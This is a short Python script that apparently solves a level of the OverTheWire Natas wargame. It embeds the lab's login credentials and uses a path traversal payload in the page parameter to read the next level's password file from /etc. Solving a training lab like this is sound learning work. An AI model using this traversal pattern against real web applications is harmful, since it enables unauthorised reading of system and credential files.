import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()

url = "http://natas7.natas.labs.overthewire.org/index.php?page="

username="natas7"
password="7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

# We will use this for relative pathing

extended_url = "../../../../etc/natas_webpass/natas8"

url += extended_url

req = session.get(url, auth=HTTPBasicAuth(username, password))

print(req.text)